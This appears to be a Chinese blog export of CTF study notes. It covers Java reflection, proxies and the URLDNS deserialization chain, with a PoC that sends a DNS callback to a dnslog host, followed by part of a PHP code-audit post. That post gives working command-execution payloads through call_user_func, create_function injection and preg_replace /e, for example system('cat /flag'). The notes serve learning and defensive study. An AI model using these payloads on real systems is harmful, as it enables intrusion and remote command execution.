&#123;</span></span><br><span class="line"><span class="comment">         System.out.println(f);</span></span><br><span class="line"><span class="comment">        &#125;*/</span></span><br><span class="line">        Field namefield=c.getDeclaredField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        namefield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        namefield.set(p,<span class="number">25</span>);</span><br><span class="line">        System.out.println(p);</span><br><span class="line">        <span class="comment">//调用类里面的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功修改</p>
<p>为上面person 类添加方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title function_">action</span><span class="params">(String act)</span>&#123;</span><br><span class="line">    System.out.println(act);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method actionmethod=c.getMethod(<span class="string">&quot;action&quot;</span>,String.class);</span><br><span class="line">      actionmethod.invoke(p,<span class="string">&quot;asdasjkjbmnmbmndf&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>修改为私有后，然后调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span>   <span class="keyword">void</span> <span class="title function_">action</span><span class="params">(String act)</span>&#123;</span><br><span class="line">    System.out.println(act);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method actionmethod=c.getDeclaredMethod(<span class="string">&quot;action&quot;</span>,String.class);</span><br><span class="line">      actionmethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      actionmethod.invoke(p,<span class="string">&quot;asdasjkjbmnmbmndf&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="jdk静态代理"><a href="#jdk静态代理" class="headerlink" title="jdk静态代理"></a>jdk静态代理</h2><p>代理模式（Proxy）：为其他对象提供一个代理以控制对这个对象的访问。<br>主要解决：在直接访问对象时带来的问题，比如说：要访问的对象在远程的机器上。在面向对象系统中，有些对象由于某些原因（比如对象创建开销很大，或者某些操作需要安全控制，或者需要进程外的访问），直接访问会给使用者或者系统结构带来很多麻烦，我们可以在访问此对象时加上一个对此对象的访问层。</p>
<p>代理模式的元素是：共同接口、代理对象、目标对象。</p>
<p>代理模式的行为：由代理对象执行目标对象的方法、由代理对象扩展目标对象的方法。</p>
<p>代理模式的宏观特性：对客户端只暴露出接口，不暴露它以下的架构。</p>
<p>好处多多：中间隔离了一层，更加符合开闭原则</p>
<p>在类的声明中，通过关键字extends来创建一个类的子类。一个类通过关键字implements声明自己使用一个或者多个接口。<br>extends 是继承某个类, 继承之后可以使用父类的方法, 也可以重写父类的方法; implements 是实现多个接口, 接口的方法一般为空的, 必须重写才能使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//接口 IUser.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IUser</span> &#123;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//原来功能 Userlmp.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserImpl</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserImpl</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;展示&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//UserProxy.java  与Userlmp 共同使用IUser 接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserProxy</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line">    IUser user;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserProxy</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="comment">//进行代理</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserProxy</span><span class="params">(IUser user)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.user=user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">    user.show();</span><br><span class="line">    <span class="comment">//实现对目标功能的扩展</span></span><br><span class="line">    System.out.println(<span class="string">&quot;调用了show&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ProxyTest.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        IUser user= <span class="keyword">new</span> <span class="title class_">UserImpl</span>();</span><br><span class="line">   <span class="comment">//    实现静态代理访问</span></span><br><span class="line">        IUser userProxy=<span class="keyword">new</span> <span class="title class_">UserProxy</span>(user);</span><br><span class="line">        userProxy.show();</span><br><span class="line">        &#125;&#125;      </span><br></pre></td></tr></table></figure>

<p>有时必须从几个类中派生出一个子类，继承它们所有的属性和方法。但是，Java不支持多重继承。有了接口，就可以得到多重继承的效果。</p>
<p>接口(interface)是抽象方法和常量值的定义的集合。</p>
<p>从本质上讲，接口是一种特殊的抽象类，这种抽象类中只包含常量和方法的定义，而没有变量和方法的实现。</p>
<p><strong>静态代理模式在不改变目标对象的前提下，实现了对目标对象的功能扩展。</strong><br><strong>不足：静态代理实现了目标对象的所有方法，一旦目标接口增加方法，代理对象和目标对象都要进行相应的修改，增加维护成本。</strong></p>
<h2 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" title="JDK动态代理"></a>JDK动态代理</h2><p>如果接口方法多，那代理必须跟着重写很多重复的代码，通过动态代理可以解决<strong>不用写代理类，直接创建代理实例，调用代理方法</strong></p>
<p>主要涉及两个类：<code>java.lang.reflect.Proxy</code> 和 <code>java.lang.reflect.InvocationHandler</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//接口 IUser.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IUser</span> &#123;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">create</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//原来功能 Userlmp.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserImpl</span> <span class="keyword">implements</span> <span class="title class_">IUser</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserImpl</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;展示&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">create</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//UserInvocationHandler.java  动态代理</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>&#123;</span><br><span class="line">    IUser user;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserInvocationHandler</span><span class="params">(IUser user)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.user=user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//invoke 回调函数，确定调用那个方法</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy,Method method,Object[] args)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用了&quot;</span>+method.getName());</span><br><span class="line">        method.invoke(user,args);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ProxyTest.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        IUser user= <span class="keyword">new</span> <span class="title class_">UserImpl</span>();</span><br><span class="line">        <span class="comment">//动态代理</span></span><br><span class="line">        <span class="comment">//要代理的接口,要做的事情</span></span><br><span class="line">        InvocationHandler userinvocationhandler=<span class="keyword">new</span> <span class="title class_">UserInvocationHandler</span>(user);</span><br><span class="line">        IUser userProxy=(IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(),user.getClass().getInterfaces(),</span><br><span class="line">        userinvocationhandler);</span><br><span class="line">        userProxy.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>动态代理一种设计模式，不修改原有类，增加功能，</p>
<p>动态代理的意义，少修改代码，适配强，在反序列化漏洞中的作用</p>
<p>readObject&gt;反序列化自动执行，invoke&gt;有函数调用，</p>
<p>拼接两条链，任意变固定</p>
<p><a href="https://www.jianshu.com/p/8ccdbe00ff06">Java代理（Proxy）模式 - 简书 (jianshu.com)</a></p>
<h2 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h2><p> URLDNS是JAVA复杂的反序列化链中最简单的一条，它不是一条真正意义上的“利⽤链”。因为它所能产生的结果不是命令执⾏，⽽是⼀次DNS请求。它使⽤Java内置的类构造，对第三⽅库没有依赖，对JDK版本没有要求，且其结果是发起一次DNS请求，不管目标有无回显，都⾮常适合用来检测是否存在反序列化漏洞</p>
<p>对链子进行分析</p>
<p>代码中最重要的三个类是HashMap,URL,URLStreamHandler。其中HashMap重写了readObject方法，URL类是里面有个hashCode()方法被HashMap的readObject()调用了，URLStreamHandler类是里面的getHostAddress被URL类里面的hashCode()方法调用</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/a1fc5b9d2a31b541.png"></p>
<p>在HashMap 中存在反序列化接口在该类的readObject方法的最后一行</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/64590666b0bd646a.png"></p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/61f192fe68fcb22f.png"></p>
<p>发现传入了一个Object类型的key，如果key为空，返回0，</p>
<p>返回 调用传入类key的hashCode 方法，而且URL类中也有URL类中含有hashCode()方法，所以是可以控制的</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/e8d2f8603bd54694.png"></p>
<p>这里说hashCode !&#x3D; -1，则直接返回hashCode，而该URL类的hashCode值被默认定义成了-1。如果等于-1，则继续往下走，我们继续跟进hashCode(this)方法</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/a7497b49e97087f1.png"></p>
<p>再跟进getHostAddress方法</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/3694b1100a74f071.png">接着跟进</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/11/3d267520d169e20b.png"></p>
<p>判断是否为空，最后执行InetAddress.getByName(host)获取目标ip地址，其实在网络中就是一次DNS请求</p>
<p>最后理一遍思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.java</span><br><span class="line">hashMap-&gt;readObject(),最后一行中调用hash(key)</span><br><span class="line">hashMap-&gt;hash(),key不为空，调用key.hashCode(),</span><br><span class="line">URL.java</span><br><span class="line">URL-&gt;hashCode(),hashCode的初始值为-1，若不为-1，返回 handler.hashCode(this);</span><br><span class="line">==&gt;URLStreamHandler.hashCode,进入getHostAddress(u),</span><br><span class="line">进入URLStreamHandler.getHostAddress，返还u.getHostAddress();即URL-&gt;getHostAddress()</span><br><span class="line">hostAddress = InetAddress.getByName(host);</span><br><span class="line">发起dns 请求</span><br></pre></td></tr></table></figure>

<p>构链思路</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashmap=new Hashmap</span><br><span class="line">url=new URL</span><br><span class="line">反射修改url1的URL的hashCode的为1</span><br><span class="line">hashMap.put(url,&quot;test&quot;)</span><br><span class="line">修改URL的hashCode为回-1</span><br></pre></td></tr></table></figure>

<p>poc 链如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">urldns</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> getObject(<span class="string">&quot;http://md8zyk.dnslog.cn&quot;</span>);</span><br><span class="line">        runReadobject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, String&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//这里不能发起请求，通过反射将url对象的hashcode改成不是一</span></span><br><span class="line">        filed.set(url1, <span class="number">123</span>);</span><br><span class="line">        <span class="comment">//同样这里需要通过反射改成一才能继续执行</span></span><br><span class="line">        hashMap.put(url1, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        filed.set(url1, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">runReadobject</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(outputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(outputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;  </span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line"><span class="keyword">import</span> java.util.Base64;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;  </span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">data</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line"><span class="type">ObjectOutput</span> <span class="variable">oos</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(data);  </span><br><span class="line">oos.writeObject(obj);  </span><br><span class="line">oos.flush();  </span><br><span class="line">oos.close();  </span><br><span class="line">System.out.println(Base64.getEncoder().encodeToString(data.toByteArray()));  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">URL url=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://28bc736c-f956-4721-8651-efc6e2beb94a.challenge.ctf.show/&quot;</span>);  </span><br><span class="line">Class&lt;?&gt; c=url.getClass();  </span><br><span class="line">Field hashcode=c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);  </span><br><span class="line">hashcode.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">hashcode.set(url,<span class="number">1</span>);  </span><br><span class="line">HashMap&lt;URL,Integer&gt; h = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();  </span><br><span class="line">h.put(url,<span class="number">1</span>);  </span><br><span class="line">hashcode.set(url,-<span class="number">1</span>);  </span><br><span class="line">serialize(h);  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>php代码审计</title>
    <url>/2024/04/03/php%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<p> php代码审计小结</p>
<h1 id="php函数"><a href="#php函数" class="headerlink" title="php函数"></a>php函数</h1><p>常用输出函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo 输出一个字符串或变量，但是不能输出数组。</span><br><span class="line"></span><br><span class="line">print_r()  输出一个数组。</span><br><span class="line"></span><br><span class="line">var_dump() 输出一个变量的结构，这个变量包含普通变量，数组，对象等</span><br><span class="line"></span><br><span class="line">get_defined_vars(void)此函数返回一个包含当前可用的变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</span><br></pre></td></tr></table></figure>

<p>在函数中使用此函数可以调试函数中的变量，而不会返回其他的变量。</p>
<p><a href="https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html">https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html</a>)</p>
<p>代码执行函数</p>
<p>eval()assert()</p>
<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>systemsystem()exec()shell_exec()passthru()pcntl_exec()popen()proc_open()</p>
<h2 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter()"></a>array_filter()</h2><p>遍历 <code>array</code> 数组中的每个值，并将每个值传递给 <code>callback</code> 回调函数。 如果 <code>callback</code> 回调函数返回 **<code>true</code>**，则将 <code>array</code> 数组中的当前值返回到结果 <a href="https://www.php.net/manual/zh/language.types.array.php">array</a> 数组中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array_filter(array $array,  $callback )</span><br><span class="line">array   要遍历的数组</span><br><span class="line">callback  使用的回调函数</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line"><span class="variable">$array1</span>=<span class="keyword">array</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$func</span> =<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">array_filter</span>(<span class="variable">$array1</span>,<span class="variable">$func</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><p>回调函数的一些使用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$parameters</span> = <span class="variable">$_GET</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$action</span>, ...<span class="variable">$parameters</span>);</span><br><span class="line">...<span class="variable">$parameters</span>的值为<span class="keyword">array</span>(<span class="number">1</span>) &#123; [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">6</span>) <span class="string">&quot;whoami&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?action=system&amp;1=whoami</span><br></pre></td></tr></table></figure>

<p>PHP 在用户自定义函数中支持可变数量的参数列表。由 <code>...</code> 语法实现。</p>
<p>包含 <code>...</code> 的参数，会转换为指定参数变量的一个 array：</p>
<p><strong>unset()</strong> 函数用于销毁给定的变量</p>
<h3 id="拓展2"><a href="#拓展2" class="headerlink" title="拓展2"></a>拓展2</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$parameters</span> = <span class="variable">$_GET</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$action</span>, <span class="variable">$parameters</span>)(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?action=current&amp;a=current</span><br><span class="line">post:a[]=system&amp;b=whoami</span><br></pre></td></tr></table></figure>

<h3 id="拓展3"><a href="#拓展3" class="headerlink" title="拓展3"></a>拓展3</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class A&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$parameters</span> = <span class="variable">$_GET</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$parameters</span>[<span class="string">&#x27;action&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$action</span>, <span class="variable">$parameters</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?action=A::f</span><br><span class="line">post:a=whoami</span><br></pre></td></tr></table></figure>

<h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>ctfshow 147</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">GET ?show=;&#125;;system(&#x27;grep flag flag.php&#x27;);/*</span><br><span class="line">POSOT ctf=%5ccreate_function</span><br></pre></td></tr></table></figure>

<h2 id="pre-replace"><a href="#pre-replace" class="headerlink" title="pre_replace"></a>pre_replace</h2><p><a href="https://www.sqlsec.com/2020/07/preg_replace.html">PHP preg_系列漏洞小结 | 国光 (sqlsec.com)</a></p>
<p>php5.5 之后废除</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(.*)/ei&#x27;</span>, <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>另一个版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo preg_replace($_GET[&#x27;a&#x27;],$_GET[&#x27;b&#x27;],$_GET[&#x27;c&#x27;]);</span><br></pre></td></tr></table></figure>

<p>传入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=/zhou/e&amp;b=system(&#x27;cat /flag&#x27;)&amp;c=zhou</span><br></pre></td></tr></table></figure>



<h2 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a>array_map()</h2><p><strong>array_map()</strong> 返回一个 <a href="https://www.php.net/manual/zh/language.types.array.php">array</a>，包含将 <code>array</code> 的相应值作为回调的参数顺序调用 <code>callback</code> 后的结果</p>
